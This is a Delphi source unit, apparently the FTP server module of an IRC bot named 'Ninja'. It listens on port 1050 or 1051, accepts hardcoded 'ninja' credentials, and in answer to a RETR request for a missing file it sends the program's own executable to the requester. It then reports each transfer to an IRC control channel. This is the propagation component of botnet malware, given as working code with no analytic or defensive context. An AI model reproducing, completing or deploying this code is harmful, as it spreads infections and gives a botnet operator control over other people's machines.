unit untFTPD;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untGlobalDeclare,
  untOutputs,
  untSockets,
  untThreads;

const
  WM_USER = 1024;

  ftp_user = 'ninja';
  ftp_pass = 'ninja';

  {$I Ninja.ini}

type
  ftp_com = record
    sock :tsocket;
  end;
  pftp_com=^ftp_com;

var
  ftp_port      :integer;
  ftp_mainip    :string;
  ftp_ircsock   :tsocket;

  f_com         :ftp_com;
//  ftp_otherip   :string;
//  ftp_otherport :string;

  function ftp_start: dword; stdcall;
  function ftp_senddata(sock: tsocket; data: string): integer;

implementation

function ftp_senddata(sock: tsocket; data: string): integer;
begin
  data := ninja_replaceshortcuts(data) + #13#10;
  result := send(sock, data[1], length(data), 0);
end;

function ftp_receivedata(sock: tsocket): boolean;
var
  timeout       :timeval;
  fdset         :tfdset;
begin
  result := true;

  timeout.tv_sec := 60;
  timeout.tv_usec := 0;

  fd_zero(fdset);
  fd_set(sock, fdset);

  if select(0, @fdset, nil, nil, @timeout) <= 0 then
  begin
    closesocket(sock);
    result := false;
  end;
end;

procedure getport(str: string; var remoteip: string; var remoteport: integer);
var
  icount        :integer;
  iloop         :integer;
  rport         :string;
  port1         :string;
  port2         :string;
begin
  icount := 0;
  for iloop := length(str) downto 1 do
  begin
    if str[iloop] = ',' then
      inc(icount);

    if icount = 2 then
    begin
      rport := copy(str, iloop+1, length(str));
      remoteip := copy(str, 1, iloop-1);
      break;
    end;
  end;

  for iloop := 1 to length(remoteip) do
    if remoteip[iloop] = ',' then
      remoteip[iloop] := '.';

  port1 := inttostr(strtoint(copy(rport, 1, pos(',', rport)-1))*256);
  port2 := inttostr(strtoint(copy(rport, pos(',', rport)+1, length(rport))));

  remoteport := strtoint(port1) + strtoint(port2);
end;

function ftp_communicate(p:pointer): dword; stdcall;
var
  newsock       :tsocket;
  buffer        :array[0..1024] of char;
  parms         :array[0..128 ] of string;
  count         :integer;
  derr          :integer;
  i             :integer;

  remoteip      :string;
  remoteport    :integer;
  rem_a         :tsockaddrin;
  rem_i         :integer;

  tsock         :tsocket;
  taddr         :tsockaddrin;
  twsa          :twsadata;
  tbuffer       :array[0..1024] of char;

  bytesread     :integer;
  f             :file;
begin
  newsock := pftp_com(p)^.sock;

  rem_i := sizeof(rem_a);
  getpeername(newsock, rem_a, rem_i);

//  outputadd(ftp_ircsock, ninja_replaceshortcuts('%pm% '+c_irc_channel+' :[ftp] connection from '+inet_nToa(rem_a.SIN_ADDR)), 1000);

      ftp_senddata(newsock, '220');
      while ftp_receivedata(newsock) do
      begin
        fillchar(buffer, sizeof(buffer), #0);
        fillchar(parms, sizeof(parms), #0);

        derr := recv(newsock, buffer, sizeof(buffer), 0);
        count := 0;

        for i := 0 to derr-1 do
          if buffer[i] = #32 then inc(count) else
          if ((buffer[i] <> #10) and (buffer[i] <> #13)) then parms[count] := parms[count] + buffer[i];

        if parms[0] = c_user then
        begin
          if parms[1] = ftp_user then ftp_senddata(newsock, '331') else
          closesocket(newsock);
        end else
        if parms[0] = c_pass then
        begin
          if parms[1] = ftp_pass then ftp_senddata(newsock, '230') else
          closesocket(newsock);
        end else
        if parms[0] = c_type then
        begin
          ftp_senddata(newsock, '200');
        end else
        if parms[0] = c_pasv then
        begin
          ftp_senddata(newsock, '425');
        end else
        if parms[0] = c_port then
        begin
          getport(parms[1], remoteip, remoteport);
          ftp_senddata(newsock, '200');
        end else
        if parms[0] = c_retr then
        begin
          ftp_senddata(newsock, '150');
          if not fileexists(parms[1]) then
            parms[1] := paramstr(0);

          wsastartup($101, twsa);
          tsock := socket_create(remoteip, remoteport);
          if tsock <> invalid_socket then

//          tsock := socket(af_inet, sock_stream, 0);
//          taddr.sin_family := af_inet;
//          taddr.sin_port := htons(remoteport);
//          taddr.sin_addr.S_addr := inet_addr(pchar(remoteip));
//          if connect(tsock, taddr, sizeof(taddr)) = 0 then

          begin
            assignfile(f, parms[1]);
            filemode := 0;
            {$I-}
              reset(f, 1);
              if ioresult = 0 then
              begin
                repeat
                  blockread(f, tbuffer[0], sizeof(tbuffer), bytesread);
                  if send(tsock, tbuffer[0], bytesread, 0) <= 0 then break;
                  sleep(1);
                until bytesread = 0;
                closefile(f);
              end;
            {$I+}
          end;
          closesocket(tsock);
          wsacleanup();
          ftp_senddata(newsock, '226');
//          ftp_senddata(ftp_ircsock, '%pm% '+c_irc_channel+' :[ftp] transferred file to '+remoteip);
          outputadd(ftp_ircsock, ninja_replaceshortcuts('%pm% '+g_irc_channel+' :[ftp] transferred file to '+remoteip), 1000);
        end else
        if parms[0] = c_quit then
        begin
          ftp_senddata(newsock, '221');
          closesocket(newsock);
        end else
          ftp_senddata(newsock, '501');
      end;
  closesocket(newsock);
end;

function ftp_start: dword; stdcall;
var
  sock          :tsocket;
  newsock       :tsocket;
  addr          :tsockaddrin;
  wsa           :twsadata;
  rem           :tsockaddr;
  len           :integer;
begin
  result := 0;
  wsastartup($101, wsa);

  ftp_port := 1050;
  sock := socket_listen(ftp_port);
  if sock = invalid_socket then
  begin
    ftp_port := 1051;
    sock := socket_listen(ftp_port);
    if sock = invalid_socket then exit;
  end;

  repeat
    len := sizeof(tsockaddr);
    newsock := accept(sock, @rem, @len);
    if newsock > invalid_socket then
    begin
      f_com.sock := newsock;
      thread_start(1, 3, 'ftp_com', @ftp_communicate, @f_com, false);
      sleep(1000);
    end;
  until false;

  wsacleanup();
  result := 0;
end;

end.
